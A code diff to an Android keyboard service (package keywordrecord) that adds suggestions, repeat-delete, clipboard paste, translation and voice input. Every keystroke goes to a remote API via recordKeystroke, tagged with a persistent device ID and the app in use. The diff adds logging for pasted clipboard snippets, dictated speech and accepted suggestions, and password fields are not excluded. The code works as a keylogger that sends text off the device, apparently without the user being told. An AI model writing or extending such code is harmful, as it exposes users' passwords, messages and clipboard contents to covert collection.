@@ -1,13 +1,23 @@
 package com.keywordrecord.keyboard
 
+import android.content.ClipboardManager
+import android.content.Context
 import android.content.Intent
 import android.inputmethodservice.InputMethodService
+import android.net.Uri
+import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.speech.RecognitionListener
+import android.speech.RecognizerIntent
+import android.speech.SpeechRecognizer
 import android.text.Editable
 import android.text.InputType
 import android.text.TextWatcher
 import android.util.TypedValue
 import android.view.Gravity
 import android.view.LayoutInflater
+import android.view.MotionEvent
 import android.view.View
 import android.view.inputmethod.EditorInfo
 import android.widget.Button
@@ -16,16 +26,22 @@ import android.widget.GridLayout
 import android.widget.ImageButton
 import android.widget.ImageView
 import android.widget.LinearLayout
+import android.widget.PopupMenu
 import android.widget.TextView
+import android.widget.Toast
 import androidx.core.view.ViewCompat
 import androidx.core.view.WindowInsetsCompat
 import com.keywordrecord.keyboard.R
+import java.util.Locale
 
 class KeyboardIME : InputMethodService() {
 
     private lateinit var apiClient: ApiClient
+    private lateinit var suggestionProvider: DictionarySuggestionProvider
     private lateinit var deviceUniqueId: String
     private var isShiftOn = false
+    private var forceAllCaps = false
+    private val letterKeyLabels = mutableListOf<Pair<TextView, String>>()
     private var currentText = StringBuilder()
     private var currentMode = KeyboardMode.LETTERS
     private var selectedEmojiCategory = 0
@@ -35,6 +51,10 @@ class KeyboardIME : InputMethodService() {
     private lateinit var panelSymbols: LinearLayout
     private lateinit var panelEmoji: LinearLayout
     private lateinit var toolbarStrip: LinearLayout
+    private lateinit var suggestionStrip: LinearLayout
+    private lateinit var suggestionLeft: TextView
+    private lateinit var suggestionCenter: TextView
+    private lateinit var suggestionRight: TextView
     private lateinit var bottomRow: LinearLayout
     private lateinit var bottomRowEmoji: LinearLayout
     private lateinit var emojiGrid: GridLayout
@@ -48,6 +68,33 @@ class KeyboardIME : InputMethodService() {
     private lateinit var enterButton: ImageButton
     private var keyboardRoot: View? = null
     private var symbolPage = 1
+    private var isRepeatingDelete = false
+    private var deleteRepeatCount = 0
+    private val deleteHandler = Handler(Looper.getMainLooper())
+    private val uiHandler = Handler(Looper.getMainLooper())
+    private val suggestionUpdateRunnable = Runnable { updateSuggestionsNow() }
+    private var pendingRecordKey: String? = null
+    private var pendingRecordAction: String? = null
+    private val recordFlushRunnable = Runnable { flushPendingRecord() }
+    private var speechRecognizer: SpeechRecognizer? = null
+    private var isListeningVoice = false
+
+    private val deleteRepeatRunnable = object : Runnable {
+        override fun run() {
+            if (!isRepeatingDelete) return
+            if (!handleDelete()) {
+                stopRepeatDelete()
+                return
+            }
+            deleteRepeatCount++
+            val delay = when {
+                deleteRepeatCount < 8 -> 120L
+                deleteRepeatCount < 25 -> 60L
+                else -> 30L
+            }
+            deleteHandler.postDelayed(this, delay)
+        }
+    }
 
     private val letterRows = listOf(
         listOf("Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"),
@@ -80,7 +127,43 @@ class KeyboardIME : InputMethodService() {
     override fun onCreate() {
         super.onCreate()
         apiClient = ApiClient(this)
+        suggestionProvider = DictionarySuggestionProvider(this)
+        suggestionProvider.initialize()
         deviceUniqueId = DeviceIdManager.getDeviceUniqueId(this)
+        setupSpeechRecognizer()
+    }
+
+    private fun setupSpeechRecognizer() {
+        if (!SpeechRecognizer.isRecognitionAvailable(this)) return
+        speechRecognizer = SpeechRecognizer.createSpeechRecognizer(this)
+        speechRecognizer?.setRecognitionListener(object : RecognitionListener {
+            override fun onReadyForSpeech(params: Bundle?) {}
+            override fun onBeginningOfSpeech() {}
+            override fun onRmsChanged(rmsdB: Float) {}
+            override fun onBufferReceived(buffer: ByteArray?) {}
+            override fun onEndOfSpeech() { isListeningVoice = false }
+            override fun onError(error: Int) { isListeningVoice = false }
+            override fun onResults(results: Bundle?) {
+                isListeningVoice = false
+                val matches = results?.getStringArrayList(SpeechRecognizer.RESULTS_RECOGNITION)
+                val text = matches?.firstOrNull()?.trim().orEmpty()
+                if (text.isNotEmpty()) {
+                    val formatted = if (isShiftOn) capitalizeWord(text) else text.lowercase(Locale.getDefault())
+                    currentConnection?.commitText("$formatted ", 1)
+                    currentText.append("$formatted ")
+                    recordAction(formatted.take(30), "voice")
+                    scheduleUpdateSuggestions()
+                }
+            }
+            override fun onPartialResults(partialResults: Bundle?) {}
+            override fun onEvent(eventType: Int, params: Bundle?) {}
+        })
+    }
+
+    override fun onDestroy() {
+        speechRecognizer?.destroy()
+        speechRecognizer = null
+        super.onDestroy()
     }
 
     override fun onCreateInputView(): View {
@@ -109,6 +192,10 @@ class KeyboardIME : InputMethodService() {
         panelSymbols = root.findViewById(R.id.panel_symbols)
         panelEmoji = root.findViewById(R.id.panel_emoji)
         toolbarStrip = root.findViewById(R.id.toolbar_strip)
+        suggestionStrip = root.findViewById(R.id.suggestion_strip)
+        suggestionLeft = root.findViewById(R.id.suggestion_left)
+        suggestionCenter = root.findViewById(R.id.suggestion_center)
+        suggestionRight = root.findViewById(R.id.suggestion_right)
         bottomRow = root.findViewById(R.id.bottom_row)
         bottomRowEmoji = root.findViewById(R.id.bottom_row_emoji)
         emojiGrid = root.findViewById(R.id.emoji_grid)
@@ -124,6 +211,7 @@ class KeyboardIME : InputMethodService() {
         setupEmojiLibrary()
         setupBottomRow(root)
         setupToolbar(root)
+        setupSuggestions()
         switchMode(KeyboardMode.LETTERS)
     }
 
@@ -153,7 +241,7 @@ class KeyboardIME : InputMethodService() {
         }
 
         val deleteButton = createIconKey(R.drawable.ic_backspace, KeyStyle.FUNCTION, 1.3f)
-        deleteButton.setOnClickListener { handleDelete() }
+        setupRepeatDelete(deleteButton)
         row3.addView(deleteButton)
     }
 
@@ -195,7 +283,7 @@ class KeyboardIME : InputMethodService() {
         }
 
         val deleteButton = createIconKey(R.drawable.ic_backspace, KeyStyle.FUNCTION, 1.35f)
-        deleteButton.setOnClickListener { handleDelete() }
+        setupRepeatDelete(deleteButton)
         row3.addView(deleteButton)
     }
 
@@ -336,22 +424,296 @@ class KeyboardIME : InputMethodService() {
             switchMode(KeyboardMode.LETTERS)
         }
 
-        root.findViewById<ImageButton>(R.id.btn_emoji_delete).setOnClickListener {
-            handleDelete()
+        root.findViewById<ImageButton>(R.id.btn_emoji_delete).let { setupRepeatDelete(it) }
+    }
+
+    private fun setupRepeatDelete(button: View) {
+        button.setOnTouchListener { view, event ->
+            when (event.action) {
+                MotionEvent.ACTION_DOWN -> {
+                    view.isPressed = true
+                    startRepeatDelete()
+                    true
+                }
+                MotionEvent.ACTION_UP, MotionEvent.ACTION_CANCEL -> {
+                    view.isPressed = false
+                    stopRepeatDelete()
+                    true
+                }
+                else -> false
+            }
         }
     }
 
-    private fun setupToolbar(root: View) {
-        root.findViewById<ImageButton>(R.id.btn_toolbar_grid).setOnClickListener {
-            val intent = Intent(this, SettingsActivity::class.java).apply {
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+    private fun startRepeatDelete() {
+        isRepeatingDelete = true
+        deleteRepeatCount = 0
+        handleDelete()
+        deleteHandler.postDelayed(deleteRepeatRunnable, 350L)
+    }
+
+    private fun stopRepeatDelete() {
+        isRepeatingDelete = false
+        deleteHandler.removeCallbacks(deleteRepeatRunnable)
+    }
+
+    private fun setupSuggestions() {
+        listOf(suggestionLeft, suggestionCenter, suggestionRight).forEach { view ->
+            view.setOnClickListener {
+                val word = view.text?.toString()?.trim().orEmpty()
+                if (word.isNotEmpty()) {
+                    applySuggestion(word)
+                }
             }
-            startActivity(intent)
+        }
+    }
+
+    private fun getCurrentComposingSegment(): String {
+        val before = currentConnection?.getTextBeforeCursor(100, 0)?.toString() ?: return ""
+        if (before.isEmpty()) return ""
+        val segment = StringBuilder()
+        for (i in before.length - 1 downTo 0) {
+            val char = before[i]
+            if (char.isLetter() || char == ' ') {
+                segment.insert(0, char)
+            } else {
+                break
+            }
+        }
+        return segment.toString()
+    }
+
+    private fun getCurrentWordPrefix(): String {
+        val segment = getCurrentComposingSegment()
+        if (segment.isEmpty() || !segment.last().isLetter()) return ""
+        return segment.takeLastWhile { it.isLetter() }
+    }
+
+    private fun getPreviousWord(): String {
+        return suggestionProvider.parseComposing(getCurrentComposingSegment()).previousWord
+    }
+
+    private fun isKeyboardReady(): Boolean = ::suggestionStrip.isInitialized
+
+    private fun scheduleUpdateSuggestions() {
+        if (!isKeyboardReady()) return
+        uiHandler.removeCallbacks(suggestionUpdateRunnable)
+        uiHandler.postDelayed(suggestionUpdateRunnable, 35)
+    }
+
+    private fun updateSuggestionsNow() {
+        if (!isKeyboardReady()) return
+
+        if (currentMode != KeyboardMode.LETTERS) {
+            toolbarStrip.visibility = View.VISIBLE
+            suggestionStrip.visibility = View.GONE
+            clearSuggestionViews()
+            return
+        }
+
+        val context = suggestionProvider.parseComposing(getCurrentComposingSegment())
+        val isTyping = context.segment.isNotEmpty()
+
+        if (!isTyping) {
+            toolbarStrip.visibility = View.VISIBLE
+            suggestionStrip.visibility = View.GONE
+            clearSuggestionViews()
+            return
+        }
+
+        toolbarStrip.visibility = View.GONE
+        suggestionStrip.visibility = View.VISIBLE
+
+        if (!suggestionProvider.isInitialized()) {
+            uiHandler.postDelayed(suggestionUpdateRunnable, 150)
+            clearSuggestionViews()
+            return
+        }
+
+        val suggestions = suggestionProvider.getSuggestions(context, 5)
+
+        if (suggestions.isEmpty()) {
+            clearSuggestionViews()
+            return
+        }
+        when (suggestions.size) {
+            1 -> {
+                bindSuggestion(suggestionLeft, null)
+                bindSuggestion(suggestionCenter, suggestions[0])
+                bindSuggestion(suggestionRight, null)
+            }
+            2 -> {
+                bindSuggestion(suggestionLeft, suggestions[0])
+                bindSuggestion(suggestionCenter, suggestions[1])
+                bindSuggestion(suggestionRight, null)
+            }
+            else -> {
+                bindSuggestion(suggestionLeft, suggestions[1])
+                bindSuggestion(suggestionCenter, suggestions[0])
+                bindSuggestion(suggestionRight, suggestions[2])
+            }
+        }
+    }
+
+    private fun bindSuggestion(view: TextView, text: String?) {
+        if (text.isNullOrEmpty()) {
+            view.text = ""
+            view.visibility = View.INVISIBLE
+            view.isClickable = false
+        } else {
+            view.text = formatSuggestionForInsert(text)
+            view.visibility = View.VISIBLE
+            view.isClickable = true
+        }
+    }
+
+    private fun formatLetterOutput(letter: String): String {
+        val base = if (isShiftOn) letter.uppercase() else letter.lowercase()
+        if (forceAllCaps) return base.uppercase(Locale.getDefault())
+        return base
+    }
+
+    private fun readInputAttributes(attribute: EditorInfo?) {
+        forceAllCaps = false
+        val inputType = attribute?.inputType ?: return
+        if (inputType and InputType.TYPE_TEXT_FLAG_CAP_CHARACTERS != 0) {
+            forceAllCaps = true
+        }
+    }
+
+    private fun capitalizeWord(word: String): String {
+        if (word.isEmpty()) return word
+        return word.replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.getDefault()) else it.toString() }
+    }
+
+    private fun formatSuggestionForInsert(text: String): String {
+        if (forceAllCaps) return text.uppercase(Locale.getDefault())
+        if (isShiftOn) {
+            return if (text.contains(' ')) {
+                text.split(" ").joinToString(" ") { capitalizeWord(it.lowercase(Locale.getDefault())) }
+            } else {
+                capitalizeWord(text.lowercase(Locale.getDefault()))
+            }
+        }
+        return text.lowercase(Locale.getDefault())
+    }
+
+    private fun clearSuggestionViews() {
+        if (!isKeyboardReady()) return
+        listOf(suggestionLeft, suggestionCenter, suggestionRight).forEach { view ->
+            view.text = ""
+            view.visibility = View.GONE
+        }
+    }
+
+    private fun applySuggestion(suggestion: String) {
+        val connection = currentConnection ?: return
+        val segment = getCurrentComposingSegment()
+        val wordPrefix = getCurrentWordPrefix()
+        val isPhraseSuggestion = suggestion.contains(' ')
+
+        val deleteLength = when {
+            isPhraseSuggestion -> segment.trimEnd().length
+            else -> wordPrefix.length
+        }
+
+        if (deleteLength > 0) {
+            connection.deleteSurroundingText(deleteLength, 0)
+            repeat(deleteLength.coerceAtMost(currentText.length)) {
+                if (currentText.isNotEmpty()) {
+                    currentText.deleteCharAt(currentText.length - 1)
+                }
+            }
+        }
+
+        val output = formatSuggestionForInsert(suggestion)
+        val textToInsert = "$output "
+        connection.commitText(textToInsert, 1)
+        currentText.append(textToInsert)
+        recordAction(output, "suggestion")
+        scheduleUpdateSuggestions()
+    }
+
+    private fun setupToolbar(root: View) {
+        root.findViewById<ImageButton>(R.id.btn_toolbar_grid).setOnClickListener { button ->
+            showToolbarMenu(button)
         }
 
         root.findViewById<ImageButton>(R.id.btn_toolbar_clipboard).setOnClickListener {
+            pasteFromClipboard()
+        }
+
+        root.findViewById<ImageButton>(R.id.btn_toolbar_translate).setOnClickListener {
+            openTranslate()
+        }
+
+        root.findViewById<ImageButton>(R.id.btn_toolbar_palette).setOnClickListener {
             openEmojiLibrary()
         }
+
+        root.findViewById<ImageButton>(R.id.btn_toolbar_mic).setOnClickListener {
+            startVoiceInput()
+        }
+    }
+
+    private fun showToolbarMenu(anchor: View) {
+        val menu = PopupMenu(this, anchor)
+        menu.menu.add(0, 2, 0, getString(R.string.toolbar_menu_hide))
+        menu.setOnMenuItemClickListener { item ->
+            when (item.itemId) {
+                2 -> {
+                    requestHideSelf(0)
+                    true
+                }
+                else -> false
+            }
+        }
+        menu.show()
+    }
+
+    private fun pasteFromClipboard() {
+        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+        val clip = clipboard.primaryClip
+        val text = clip?.takeIf { it.itemCount > 0 }?.getItemAt(0)?.coerceToText(this)?.toString()?.trim()
+        if (text.isNullOrEmpty()) {
+            Toast.makeText(this, getString(R.string.clipboard_empty), Toast.LENGTH_SHORT).show()
+            return
+        }
+        currentConnection?.commitText(text, 1)
+        currentText.append(text)
+        recordAction(text.take(20), "paste")
+        Toast.makeText(this, getString(R.string.clipboard_pasted), Toast.LENGTH_SHORT).show()
+        scheduleUpdateSuggestions()
+    }
+
+    private fun openTranslate() {
+        val query = getCurrentWordPrefix().ifEmpty { getPreviousWord() }.ifEmpty { "hello" }
+        val uri = Uri.parse(
+            "https://translate.google.com/?sl=auto&tl=hi&text=${Uri.encode(query)}"
+        )
+        try {
+            startActivity(Intent(Intent.ACTION_VIEW, uri).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            })
+        } catch (_: Exception) {
+            Toast.makeText(this, getString(R.string.translate_opening), Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    private fun startVoiceInput() {
+        val recognizer = speechRecognizer
+        if (recognizer == null || isListeningVoice) {
+            Toast.makeText(this, getString(R.string.voice_not_available), Toast.LENGTH_SHORT).show()
+            return
+        }
+        val intent = Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH).apply {
+            putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL, RecognizerIntent.LANGUAGE_MODEL_FREE_FORM)
+            putExtra(RecognizerIntent.EXTRA_LANGUAGE, Locale.getDefault())
+            putExtra(RecognizerIntent.EXTRA_PARTIAL_RESULTS, true)
+        }
+        isListeningVoice = true
+        recognizer.startListening(intent)
+        Toast.makeText(this, getString(R.string.voice_listening), Toast.LENGTH_SHORT).show()
     }
 
     override fun onComputeInsets(outInsets: InputMethodService.Insets) {
@@ -370,6 +732,9 @@ class KeyboardIME : InputMethodService() {
         panelSymbols.visibility = if (mode == KeyboardMode.SYMBOLS) View.VISIBLE else View.GONE
         panelEmoji.visibility = if (mode == KeyboardMode.EMOJI) View.VISIBLE else View.GONE
         toolbarStrip.visibility = if (mode == KeyboardMode.EMOJI) View.GONE else View.VISIBLE
+        if (isKeyboardReady()) {
+            suggestionStrip.visibility = View.GONE
+        }
         bottomRow.visibility = if (mode == KeyboardMode.EMOJI) View.GONE else View.VISIBLE
         bottomRowEmoji.visibility = if (mode == KeyboardMode.EMOJI) View.VISIBLE else View.GONE
 
@@ -395,6 +760,12 @@ class KeyboardIME : InputMethodService() {
         emojiButton.setBackgroundResource(
             if (mode == KeyboardMode.EMOJI) R.drawable.key_shift_active_shape else R.drawable.key_function_selector
         )
+
+        if (mode == KeyboardMode.LETTERS) {
+            scheduleUpdateSuggestions()
+        } else {
+            clearSuggestionViews()
+        }
     }
 
     private fun toggleShift() {
@@ -402,6 +773,13 @@ class KeyboardIME : InputMethodService() {
         shiftButton.setBackgroundResource(
             if (isShiftOn) R.drawable.key_shift_active_shape else R.drawable.key_function_selector
         )
+        refreshLetterKeyLabels()
+    }
+
+    private fun refreshLetterKeyLabels() {
+        letterKeyLabels.forEach { (view, letter) ->
+            view.text = if (isShiftOn) letter.uppercase() else letter.lowercase()
+        }
     }
 
     private fun createLetterKey(letter: String, numberHint: String? = null): View {
@@ -409,7 +787,8 @@ class KeyboardIME : InputMethodService() {
         val letterView = keyView.findViewById<TextView>(R.id.key_letter)
         val hintView = keyView.findViewById<TextView>(R.id.key_hint)
 
-        letterView.text = letter.lowercase()
+        letterKeyLabels.add(letterView to letter)
+        letterView.text = if (isShiftOn) letter.uppercase() else letter.lowercase()
         if (numberHint != null) {
             hintView.text = numberHint
             hintView.visibility = View.VISIBLE
@@ -418,11 +797,7 @@ class KeyboardIME : InputMethodService() {
 
         keyView.layoutParams = createLayoutParams(1f)
         keyView.setOnClickListener {
-            val output = if (isShiftOn) letter.uppercase() else letter.lowercase()
-            handleCharacter(output, "key")
-            if (isShiftOn) {
-                toggleShift()
-            }
+            handleCharacter(formatLetterOutput(letter), "key")
         }
         return keyView
     }
@@ -531,26 +906,45 @@ class KeyboardIME : InputMethodService() {
         currentConnection?.commitText(char, 1)
         currentText.append(char)
         recordAction(char, action)
+        if (currentMode == KeyboardMode.LETTERS && action == "key") {
+            scheduleUpdateSuggestions()
+        } else if (currentMode == KeyboardMode.LETTERS && isKeyboardReady()) {
+            scheduleUpdateSuggestions()
+        }
     }
 
     private fun handleSpace() {
         currentConnection?.commitText(" ", 1)
         currentText.append(" ")
         recordAction(" ", "space")
+        if (currentMode == KeyboardMode.LETTERS) {
+            scheduleUpdateSuggestions()
+        }
     }
 
-    private fun handleDelete() {
-        val connection = currentConnection ?: return
+    private fun handleDelete(): Boolean {
+        val connection = currentConnection ?: return false
         val selected = connection.getSelectedText(0)
         if (selected != null && selected.isNotEmpty()) {
             connection.commitText("", 1)
-        } else {
-            connection.deleteSurroundingText(1, 0)
-            if (currentText.isNotEmpty()) {
-                currentText.deleteCharAt(currentText.length - 1)
-            }
+            recordAction("⌫", "delete")
+            return true
+        }
+
+        val before = connection.getTextBeforeCursor(1, 0)
+        if (before == null || before.isEmpty()) {
+            return false
+        }
+
+        connection.deleteSurroundingText(1, 0)
+        if (currentText.isNotEmpty()) {
+            currentText.deleteCharAt(currentText.length - 1)
         }
         recordAction("⌫", "delete")
+        if (currentMode == KeyboardMode.LETTERS) {
+            scheduleUpdateSuggestions()
+        }
+        return true
     }
 
     private fun handleEnter() {
@@ -568,9 +962,23 @@ class KeyboardIME : InputMethodService() {
             currentText.append("\n")
             recordAction("↵", "enter")
         }
+        if (currentMode == KeyboardMode.LETTERS) {
+            scheduleUpdateSuggestions()
+        }
     }
 
     private fun recordAction(keyPressed: String, action: String) {
+        pendingRecordKey = keyPressed
+        pendingRecordAction = action
+        uiHandler.removeCallbacks(recordFlushRunnable)
+        uiHandler.postDelayed(recordFlushRunnable, 250)
+    }
+
+    private fun flushPendingRecord() {
+        val keyPressed = pendingRecordKey ?: return
+        val action = pendingRecordAction ?: return
+        pendingRecordKey = null
+        pendingRecordAction = null
         val appPackage = currentInputEditorInfo?.packageName ?: "unknown"
         apiClient.recordKeystroke(
             deviceUniqueId = deviceUniqueId,
@@ -583,10 +991,19 @@ class KeyboardIME : InputMethodService() {
 
     override fun onStartInput(attribute: EditorInfo?, restarting: Boolean) {
         super.onStartInput(attribute, restarting)
+        stopRepeatDelete()
         if (!restarting) {
             currentText.clear()
         }
+        readInputAttributes(attribute)
         updateEnterKeyIcon()
+        scheduleUpdateSuggestions()
+    }
+
+    override fun onFinishInput() {
+        flushPendingRecord()
+        stopRepeatDelete()
+        super.onFinishInput()
     }
 
     private val currentConnection
